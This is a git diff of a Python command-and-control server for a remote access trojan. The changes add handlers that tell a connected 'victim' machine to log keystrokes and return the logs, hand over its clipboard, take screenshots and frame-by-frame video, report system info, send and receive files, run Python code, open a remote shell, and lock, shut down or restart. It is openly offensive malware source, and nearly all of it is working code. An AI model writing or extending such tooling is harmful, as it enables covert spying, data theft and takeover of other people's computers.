@@ -37,21 +37,27 @@ class Server:
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         self.Switcher = {
-            #"-Host": self.sendHostInfo,
-            "-Msg": self.sendMsg,
-        #     "-Fsend": self.filesend,
-        #     "-RP": self.runprocess,
-        #     "-RR": self.runrun,
-             "-Telnet": self.enableTN,
-             "-Chess": self.playchess,
-             "-EpIV": self.playstarwars,
-             "-Weather": self.weather,
-             "-lock": self.locksystem,
-             "-shutdown": self.shutdown,
-        #     "-shutdownM": self.shutdownmessage,
-        #     "-restart": self.restart,
-        #     "-shell": self.fakeshell,
-        #     "-loop": self.endless
+            "-msgbox": self.systemmsg,
+            "-msg": self.sendMsg,
+            "-shutdown": self.shutdown,
+            "-shutdownM": self.shutdownmessage,
+            "-lock": self.locksystem,
+            "-restart": self.restartsystem,
+            "-EpIV": self.playstarwars,
+            "-chess": self.playchess,
+            "-weather": self.weather,
+            "-telnet": self.enableTN,
+            "-KLstart": self.startKeyLogger,
+            #"-KLend": self.stopKeyLogger,
+            "-getLogs": self.getKeyLogs,
+            "-getcb": self.getClipBoard,
+            "-Send": self.filesend,
+            "-recv": self.filereceive,
+            "-ginfo": self.getTargetInfo,
+            "-exe": self.exePy,
+            "-ss": self.screenshot,
+            "-vid": self.vidByFrames,
+            "-shell": self.cmdctrl
         }
 
     def startServer(self):
@@ -133,7 +139,7 @@ class Server:
 # ''' COMMAND FUNCTIONS START HERE'''
     '''WINDOWS FUNCTIONS'''
     def sendMsg(self):
-        command = "-Msg"
+        command = "-msg"
         self.client_socket.send(command.encode())
         msg = input("[+] Enter message: ")
         time.sleep(2)
@@ -151,6 +157,19 @@ class Server:
 
         # locks the user out while keeping connection up
 
+    def shutdownmessage(self):
+        command = "-shutdownM"
+        self.client_socket.send(command.encode("utf-8"))
+        msg = input("[+] Enter message: ")
+        time.sleep(2)
+        self.client_socket.send(msg.encode())
+        print(msg)
+        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
+        print(results)
+
+        self.client_socket.close()
+        print(f"[!] {self.address[0]} has been Shut Down")
+
     def locksystem(self):
         command = "-lock"
         self.client_socket.send(command.encode("utf-8"))
@@ -165,7 +184,7 @@ class Server:
 
     ## TODO: CHECK THIS
     def systemmsg(self):
-        command = "-Msg"
+        command = "-msgbox"
         self.client_socket.send(command.encode())
         msg = input("[+] Enter message: ")
         time.sleep(2)
@@ -186,7 +205,7 @@ class Server:
         print(status)
 
     def playchess(self):
-        command = "-Chess"
+        command = "-chess"
         self.client_socket.send(command.encode("utf-8"))
         status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
         if status == "SUCCESS":
@@ -196,7 +215,7 @@ class Server:
         print(status)
 
     def weather(self):
-        command = "-Weather"
+        command = "-weather"
         self.client_socket.send(command.encode("utf-8"))
         status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
         if status == "SUCCESS":
@@ -206,7 +225,7 @@ class Server:
         print(status)
 
     def enableTN(self):
-        command = "-Telnet"
+        command = "-telnet"
         self.client_socket.send(command.encode("utf-8"))
         status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
         if status == "SUCCESS":
@@ -218,14 +237,9 @@ class Server:
 # ''' KEYLOGGER FUNCTIONS '''
     def startKeyLogger(self):
         pass
-    def stopKeylogger(self):
-        command = "-start"
-        self.client_socket.send(command.encode("utf-8"))
-        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
-        print(response)
 
     def stopKeylogger(self):
-        command = "-stop"
+        command = "-KLend"
         self.client_socket.send(command.encode("utf-8"))
         response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
         print(response)
@@ -267,9 +281,59 @@ class Server:
         else:
             print("[!] FATAL: Logs do not exist!")
 
-# ''' SCREENSHOT FUNCTIONS '''
+    def getKeyLogs(self):
+        """ Receiving the keylogger files """
 
-## TODO: Update
+        command = "--getlogs"
+        self.client_socket.send(command.encode("utf-8"))
+
+        flag = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        if flag == "[OK]":
+            # recv size
+            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+            time.sleep(0.1)
+
+            if int(size) <= self.BUFFER_SIZE:
+                # recv archive
+                archive = self.client_socket.recv(self.BUFFER_SIZE)
+                print("*** Got logs ***")
+
+                with open('../receivedfile/keylogs.zip', 'wb+') as output:
+                    output.write(archive)
+
+                print("*** Logs saved ***")
+
+            else:
+                # update buffer
+                buff = self.updateBuffer(size)
+
+                # recv archive
+                fullarchive = self.saveBigFile(int(size), buff)
+
+                print("*** Got logs ***")
+                with open('../receivedfile/keylogs.zip', 'wb+') as output:
+                    output.write(fullarchive)
+
+                print("*** Logs saved ***")
+        else:
+            print("[!] FATAL: Logs do not exist!")
+
+    def getClipBoard(self):
+        """ Get victim' clipboard in plain text """
+
+        command = "-getcb"
+        self.client_socket.send(command.encode("utf-8"))
+
+        # recv clipboard
+        cb = self.client_socket.recv(self.BUFFER_SIZE)
+        print("*** Got clipboard ***")
+
+        with open('../receivedfile/cb.txt', 'w+') as f:
+            f.write(cb.decode("utf-8"))
+
+        print("*** Wrote it to cb.txt ***")
+
+# ''' FILE HANDLING '''
     def filesend(self):
         command = "-Fsend"
         self.client_socket.send(command.encode("utf-8"))
@@ -333,25 +397,38 @@ class Server:
         else:
             print(response.decode("utf-8"))
 
-    def shutdownmessage(self):
-        command = "-shutdownM"
-        self.client_socket.send(command.encode("utf-8"))
-        msg = input("[+] Enter message: ")
-        time.sleep(2)
-        self.client_socket.send(msg.encode())
-        print(msg)
-        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
-        print(results)
+    def filereceive(self):
+        command = "-Frec"
+        self.client_socket.send(command.encode())
 
-        self.client_socket.close()
-        print(f"[!] {self.address[0]} has been Shut Down")
+        while True:
+            try:
+                path = input("[+] Enter file path: ")
 
-        # locks the user out while keeping connection up
+                if not os.path.exists(path):
+                    raise FileNotFoundError
+                else:
+                    break
+            except FileNotFoundError:
+                print("[!] File not found, retry")
+
+        name = input("[+] Enter the name to save this file as on the victims device (include file extension): ")  # file name, must include extension
+        self.client_socket.send(name.encode("utf-8"))
+
+        with open(path, 'rb') as to_send:
+            fsize = os.path.getsize(path)
+            self.client_socket.send(str(fsize).encode())
+            time.sleep(1)
+
+            data = to_send.read()
+            self.client_socket.send(data)
+        print("*** File sent ***")
+# ''' MISC '''
 
     def getTargetInfo(self):
         print("here")
-        # command = "--ginfo"
-        # self.client_socket.send(command.encode("utf-8"))
+        command = "-ginfo"
+        self.client_socket.send(command.encode("utf-8"))
 
         info = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
         print("info = " + info)
@@ -387,33 +464,6 @@ class Server:
         print("**** Check moreinfo.txt for even more details on the target ****")
 
         return info
-## TODO: message
-    def filereceive(self):
-        command = "-send"
-        self.client_socket.send(command.encode())
-
-        while True:
-            try:
-                path = input("[+] Enter file path: ")
-
-                if not os.path.exists(path):
-                    raise FileNotFoundError
-                else:
-                    break
-            except FileNotFoundError:
-                print("[!] File not found, retry")
-
-        name = input("[+] Enter the name to save this file as on the victims device (include file extension): ")  # file name, must include extension
-        self.client_socket.send(name.encode("utf-8"))
-
-        with open(path, 'rb') as to_send:
-            fsize = os.path.getsize(path)
-            self.client_socket.send(str(fsize).encode())
-            time.sleep(1)
-
-            data = to_send.read()
-            self.client_socket.send(data)
-        print("*** File sent ***")
 
     def exePy(self):
         command ="-exePy"
@@ -424,6 +474,37 @@ class Server:
         response = self.client_socket.recv(self.BUFFER_SIZE).decode()
         print("*** " + response + " *** ")
 
+# ''' SCREENSHOT FUNCTIONS '''
+    def screenshot(self):
+        command = "-ss"
+        self.client_socket.send(command.encode())
+
+        # recv file size
+        recvsize = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        time.sleep(0.1)
+
+        # updating buffer
+        buff = self.updateBuffer(recvsize)
+
+        # getting the file
+        print("*** Saving screenshot ***")
+        fullscreen = self.saveBigFile(int(recvsize), buff)
+
+        # saving the file
+        with open(f'../receivedfile/{time.time()}.png', 'wb+') as screen:
+            screen.write(fullscreen)
+
+        print("*** File saved ***")
+
+    def vidByFrames(self):
+        # ''' this will take n*x screenshots where n = number of seconds and x = frames per seconds
+        n = 5  # Number of seconds
+        x = 24  # Frames per second
+        for i in range(x*n):
+            self.screenshot()
+            time.sleep(1/x)
+
+# ''' MAIN BULK '''
     def commands(self):
             # os.system("clear")
             while True:
@@ -472,7 +553,7 @@ class Server:
                 print("[!] Can't send empty command.")
                 continue
 
-            if cmd.lower() == "--back":
+            if cmd.lower() == "-back":
                 print("GO BACK")
                 break
 
@@ -492,6 +573,8 @@ class Server:
                 break
 
             print(output.decode("utf-8"))
+
+
 
 
 def main():
